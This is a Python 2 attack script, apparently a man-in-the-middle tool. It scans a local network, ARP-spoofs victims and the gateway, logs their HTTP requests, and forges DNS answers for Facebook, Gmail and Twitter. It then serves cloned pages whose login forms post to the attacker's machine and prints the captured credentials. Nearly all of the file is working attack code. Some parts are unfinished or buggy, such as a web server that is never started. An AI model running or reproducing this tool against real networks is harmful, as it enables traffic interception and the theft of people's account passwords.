#! /usr/bin/env python2

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import *
from nfqueue import *

from signal import signal, pause, SIGINT
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from subprocess import Popen, PIPE, STDOUT
from multiprocessing import Process, Pipe
from argparse import ArgumentParser
from threading import Thread, Lock, active_count
from socket import socket, gethostbyname, AF_INET
from urllib2 import urlopen
from re import sub
from os import geteuid
from time import sleep
from sys import exit

conf.verb = 0
conf.checkIPaddr = 0

VERBOSE = False
SHOWDNS = False
SHOWHTTP = False
DOMAINS = ["facebook.com", "gmail.com", "twitter.com"]
URLSKIP = ["ocsp", ".jpg", ".jpeg", ".gif", ".png", ".css", ".ico", ".js", ".svg"]

WHITE = "\033[0m"       # MAIN STATUS
GRAY = "\033[37m"       # VERBOSE STATUS
BLUE = "\033[94m"       # HTTP
GREEN = "\033[92m"      # LEGITIMATE DNS
YELLOW = "\033[33m"     # SPOOFED DNS
ORANGE = "\033[33m"     # WARNING
RED = "\033[31m"        # ERROR


class ARPSpoof(Thread):

    def __init__(self, iface, iface_mac, gw_ip, gw_mac, vic_ip):

        Thread.__init__(self)
        self.iface = iface
        self.iface_mac = iface_mac
        self.gw_ip = gw_ip
        self.gw_mac = gw_mac
        self.vic_ip = vic_ip
        self.vic_mac = get_mac(vic_ip)

    def run(self):

        if VERBOSE:
            print(GRAY + "Spoofing %s" % self.vic_ip)

        gw_pkt = ARP(op=2, hwsrc=self.iface_mac, psrc=self.vic_ip,
                     hwdst=self.gw_mac, pdst=self.gw_ip)
        vic_pkt = ARP(op=2, hwsrc=self.iface_mac, psrc=self.gw_ip,
                      hwdst=self.vic_mac, pdst=self.vic_ip)

        while True:
            send(vic_pkt, count=2)
            send(gw_pkt, count=2)
            sniff(filter="arp and host %s" % self.vic_ip , count=1, timeout=4)

    def heal(self):

        if VERBOSE:
            print(GRAY + "Healing %s" % self.vic_ip)

        gw_pkt = ARP(op=2, hwsrc=self.gw_mac, psrc=self.gw_ip,
                     hwdst=self.vic_mac, pdst=self.vic_ip)
        vic_pkt = ARP(op=2, hwsrc=self.vic_mac, psrc=self.vic_ip,
                      hwdst=self.gw_mac, pdst=self.gw_ip)

        send(vic_pkt, count=2)
        send(gw_pkt, count=2)


class URLInspect(Thread):

    def __init__(self, iface, vic_ip):

        Thread.__init__(self)
        self.iface = iface
        self.vic_ip = vic_ip
        self.past_url = None

    def run(self):

        sniff(store=0, filter="port 80 and host %s"
              % self.vic_ip, prn=self.parse, iface=self.iface)

    def stop(self):

        self.stop.set()

    def parse(self, pkt):

        if pkt.haslayer(Raw) and pkt.haslayer(TCP):
            load = repr(pkt[Raw].load)[1:-1]

            try:
                headers, body = load.split(r"\r\n\r\n", 1)

            except:
                headers = load
            header_lines = headers.split(r"\r\n")

            url = ""
            post = ""
            get = ""
            host = ""

            for l in header_lines:
                if re.search('[Hh]ost: ', l):
                    try:
                        host = l.split('Host: ', 1)[1]
                    except:
                        try:
                            host = l.split('host: ', 1)[1]
                        except:
                            pass
                if re.search('GET /', l):
                    try:
                        get = l.split('GET ')[1].split(' ')[0]
                    except:
                        pass
                if re.search('POST /', l):
                    try:
                        post = l.split(' ')[1].split(' ')[0]
                    except:
                        pass

            try:
                if host and post:
                    url = host+post

                    if len(url) > 80:
                        url = url[:77] + "..."

                    if not url == self.past_url:
                        print(BLUE + "%s POST -->  %s\t%S"
                              % (self.vic_ip, gethostbyname(url.split("/")[0]), url))

                        self.past_url = url

                elif host and get:
                    url = host+get

                    if len(url) > 80:
                        url = url[:77] + "..."

                    if any(i in url for i in URLSKIP):
                        pass

                    elif not url == self.past_url:
                        print(BLUE + "%s GET  -->  %s\t%s"
                              % (self.vic_ip, gethostbyname(url.split("/")[0]), url))

                        self.past_url = url

            except:
                pass


class DNSSpoof(Process):

    def __init__(self, iface_ip, vic_ips, dnames):

        Process.__init__(self)
        self.iface_ip = iface_ip
        self.vic_ips = vic_ips

        fixed = []
        for domain in dnames:
            if "www" == domain.split(".")[0]:
                fixed.append(".".join(domain.split(".")[1:]) + ".")
                fixed.append(domain + ".")
            else:
                fixed.append("www." + domain + ".")
                fixed.append(domain + ".")

        self.dnames = fixed

    def run(self):

        nfq = queue()
        nfq.set_callback(self.reply)
        nfq.fast_open(0, AF_INET)
        nfq.set_mode(NFQNL_COPY_PACKET)
        nfq.try_run()

    def reply(self, pkt):

        data = IP(pkt.get_data())
        if not data.haslayer(DNSQR):
            pkt.set_verdict(NF_ACCEPT)

        else:
            ip = data[IP]
            udp = data[UDP]
            dns = data[DNS]

            if ip.src in self.vic_ips:
                if SHOWDNS:
                    print(GREEN + "%s DNSQ -->  %s\t%s"
                          % (ip.src, ip.dst, dns.qd.qname))

                if dns.qd.qname in self.dnames:

                    # WEB SERVER THREAD HERE

                    pkt.set_verdict(NF_DROP)

                    reply = (IP(dst=ip.src, src=ip.dst) /
                             UDP(dport=udp.sport, sport=udp.dport) /
                             DNS(id=dns.id, qr=1, aa=1, qd=dns.qd,
                                 an=DNSRR(rrname=dns.qd.qname, ttl=10, rdata=self.iface_ip)))
                    send(reply)

                    if SHOWDNS:
                        print(YELLOW + "%s <-- DNSR  %s\t%s"
                              % (ip.src, ip.dst, self.iface_ip))

                    print(WHITE + "Attacking %s phase 1/3" % ip.src)


class HTTPHandler(BaseHTTPRequestHandler):

    def __init__(self, dname, vic_ip, iface_ip, *args):

        self.dname = dname
        self.vic_ip = vic_ip
        self.iface_ip = iface_ip
        BaseHTTPRequestHandler.__init__(self, *args)

    def falsify(self, html):

        # TO BE IMPLEMENTED PROPERLY
        # s2 = re.sub('action=".*?"', 'action="test"', s)
        return sub('action="([^"]*)"', 'action="%s/login"' % self.iface_ip, html)

    def do_GET(self):

        host, port = self.client_address
        print(BLUE + "TEST: HOST=%s" % host)

        if host == self.vic_ip:

            if VERBOSE:
                print(BLUE + "%s <-- REPLY %s" % (self.vic_ip, self.dname))

            if self.path == "/":

                try:
                    hfile = urlopen("http://%s" % self.dname)
                    html = self.falsify(hfile.read())

                except:
                    self.send_error(404, "Server Not Found: %s" % self.dname)

                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(html)
                return

    def do_POST(self):

        if self.path == "/login":
            environ = {'REQUEST_METHOD': 'POST', 'CONTENT_TYPE': self.headers['Content-Type']}
            form = FieldStorage(fp=self.rfile, headers=self.headers, environ=environ)

            ######## TEST
            print(WHITE + "%s detected %s credentials:" % (self.vic_ip, self.dname))
            print(BLUE + form)
            for att in form:
                print(RED + "\t%s" % att.value)
            ########

            self.send_response(200)
            self.end_headers()
            self.wfile.write("<meta http-equiv=\"refresh\" content=\"0; url=%s\" />" %
                             self.dname)
            return


class WebServer(Thread):

    def __init__(self, dname, vic_ip, iface_ip, port=80):

        Thread.__init__(self)
        self.port = port
        self.dname = dname
        self.vic_ip = vic_ip
        self.iface_ip = iface_ip

    def run(self):

        server = HTTPServer(('', self.port), self.handler)
        server.serve_forever()

    def handler(self, *args):

        HTTPHandler(self.dname, self.vic_ip, self.iface_ip, *args)


def set_forward(enable):

    if enable:
        Popen("sysctl -w net.ipv4.ip_forward=1", shell=True, stdout=PIPE, stderr=STDOUT)

    else:
        Popen("sysctl -w net.ipv4.ip_forward=0", shell=True, stdout=PIPE, stderr=STDOUT)


def set_nfq(enable):

    if enable:
        Popen("modprobe nfnetlink_queue", shell=True, stdout=PIPE, stderr=STDOUT)
        Popen("iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 0",
              shell=True, stdout=PIPE, stderr=STDOUT)

    else:
        Popen("iptables -F", shell=True, stdout=PIPE)
        Popen("iptables -t nat -F", shell=True, stdout=PIPE)
        Popen("iptables -X", shell=True, stdout=PIPE)
        Popen("iptables -t nat -X", shell=True, stdout=PIPE)


def nscan(iface, hosts):

    iface_ip = get_ip(iface)
    gw_ip = get_gw(iface)

    p = Popen("ip route | grep %s | grep 'src %s' | awk '{print $1}'" %
              (iface, iface_ip), shell=True, stdout=PIPE)
    netid = p.communicate()[0].rstrip()

    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") /
                     ARP(pdst=netid), timeout=4, iface=iface, inter=0.1)

    for snd, rcv in ans:
        if rcv.psrc not in [gw_ip, iface_ip] + hosts:
            hosts.append(rcv.psrc)

            if VERBOSE:
                print(GRAY + "New host detected %s" % rcv.psrc)

    return hosts


def get_ip(iface):

    p = Popen("ip route | grep %s | grep 'src' | awk '{print $9}'" % iface,
              shell=True, stdout=PIPE)
    output = p.communicate()[0].rstrip()
    return output


def get_mac(ip, local=False):

    if ip == "255.255.255.255":
        return "ff:ff:ff:ff:ff:ff"

    if local:
        p = Popen("arp -a | grep  '(%s)' | awk  '{print $4}'" % ip,
                  shell=True, stdout=PIPE)
        output = p.communicate()[0].rstrip()
        return output
    else:
        ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") /
                         ARP(pdst=ip), timeout=4, retry=2)
        for snd, rcv in ans:
            return rcv.sprintf("%Ether.src%")


def get_gw(iface):

    p = Popen("ip route show 0.0.0.0/0 dev %s | awk '{print $3}'" % iface,
              shell=True, stdout=PIPE)
    output = p.communicate()[0].rstrip()
    return output


def valid_ip(s):

    if len(s.split('.')) != 4:
        return False

    for x in s.split('.'):
        if not x.isdigit():
            return False
        if int(x) < 0 or int(x) > 255:
            return False
    return True


def get_if_list():

    f = open("/proc/net/dev", "r")
    lst = []
    f.readline()
    f.readline()

    for l in f:
        iface = l.split(":")[0].strip()
        if iface != "lo":
            lst.append(iface)
    return lst


def get_if_mac(iface):

    s = socket()
    ifreq = ioctl(s, 0x8927, struct.pack("16s16x", iface))
    s.close()
    family, mac = struct.unpack("16xh6s8x", ifreq)
    return ("%02x:"*6)[:-1] % tuple(map(ord, mac))


def get_dhcp(iface):

    dhcp = (Ether(dst='ff:ff:ff:ff:ff:ff') /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=get_if_mac(iface)) /
            DHCP(options=[("message-type", "discover"),
                ("param_req_list",
                 chr(DHCPRevOptions["router"][0]),
                 chr(DHCPRevOptions["domain"][0]),
                 chr(DHCPRevOptions["server_id"][0]),
                 chr(DHCPRevOptions["name_server"][0]),),
                "end"]))
    ans, unans = srp(dhcp, timeout=4, retry=2)

    if ans:
        for s, r in ans:
            dhcp_opt = r[0][DHCP].options
            dhcp_ip = r[0][IP].src
            for opt in dhcp_opt:
                if 'domain' in opt:
                    local_domain = opt[1]
                    pass
                else:
                    local_domain = 'None'
                if 'name_server' in opt:
                    dns_ip = opt[1]
    else:
        dns_ip = get_gw(iface)
        dhcp_ip = dns_ip
        local_domain = 'None'

    return [dhcp_ip, dns_ip, local_domain]


def main():

    def sig_handler(signal, frame):

        print(WHITE + "Exitting...")
        parent_conn.send(["STOP", None])
        child_conn.send(["STOP", None])


    signal(SIGINT, sig_handler)

    parser = ArgumentParser()
    parser.add_argument("-v", action="store_true",
                        help="enable verbose mode")

    parser.add_argument("-iface", metavar="IFACE",
                        help="select network interface [%s]" % conf.iface)

    parser.add_argument("-ip", metavar="IPADDR",
                        help="specify one or more IP addresss to attack [all]")

    parser.add_argument("-http", action="store_true",
                        help="show HTTP GET and POST traffic")

    parser.add_argument("-dns", action="store_true",
                        help="show DNS queries being requested")

    parser.add_argument("-dnames", metavar="DOMAINS",
                        help="specify some websites domain names to spoof")
    args = parser.parse_args()

    parent_conn, child_conn = Pipe()

    if geteuid() != 0:
        exit(RED + "ERROR: Please run as root/superuser")

    if args.v:
        global VERBOSE
        VERBOSE = True

    if args.http:
        global SHOWHTTP
        SHOWHTTP = True

    if args.dns:
        global SHOWDNS
        SHOWDNS = True

    if args.iface:
        iface = args.iface
    else:
        print(ORANGE + "WARNING: No interface specified, using default (%s)" % conf.iface)
        iface = conf.iface

    if args.dnames:
        global DOMAINS
        DOMAINS = args.dnames
    else:
        print(ORANGE + "WARNING: No domains specified, using default (%s)" % DOMAINS)

    vic_ips = []
    if args.ip:
        if valid_ip(args.ip):
            vic_ips.append(args.ip)
        else:
            exit(RED + "ERROR: IP address is invalid")

    else:
        while len(vic_ips) == 0:
            print(WHITE + "Scanning network")
            vic_ips = nscan(iface, vic_ips)

            if len(vic_ips) > 0:
                break

            print(ORANGE + "WARNING: No hosts detected")

    iface_ip = get_ip(iface)
    iface_mac = get_if_mac(iface)
    gw_ip = get_gw(iface)
    gw_mac = get_mac(gw_ip)

    print(WHITE + "Starting ARP spoofing")
    arpspoof_thrds = []
    for vic_ip in vic_ips:
        arpspoof_thrds.append(ARPSpoof(iface, iface_mac, gw_ip, gw_mac, vic_ip))
        arpspoof_thrds[-1].setDaemon(True)
        arpspoof_thrds[-1].start()
    set_forward(True)

    if SHOWHTTP:
        print(WHITE + "Starting HTTP inspection")
        urlinspect_thrds = []
        for vic_ip in vic_ips:
            urlinspect_thrds.append(URLInspect(iface, vic_ip))
            urlinspect_thrds[-1].setDaemon(True)
            urlinspect_thrds[-1].start()

    print(WHITE + "Starting DNS spoofing")
    dnsspoof_proc = DNSSpoof(iface_ip, vic_ips, DOMAINS)
    dnsspoof_proc.start()
    set_nfq(True)

    while True:
        if parent_conn.poll():
            recieved = parent_conn.recv()

            if recieved[0] == "STOP":
                set_forward(False)
                set_nfq(False)

                for thrd in arpspoof_thrds:
                    thrd.heal()

                break

            if recieved[0] == "NEW_VIC":
                vic_ips.append(recieved[1])

                arpspoof_thrds.append(ARPSpoof(iface, recieved[1]))
                arpspoof_thrds[-1].start()

                urlinspect_thrds.append(URLInspect(iface, recieved[1]))
                urlinspect_thrds[-1].start()

        sleep(0.2)


if __name__ == '__main__':
    main()
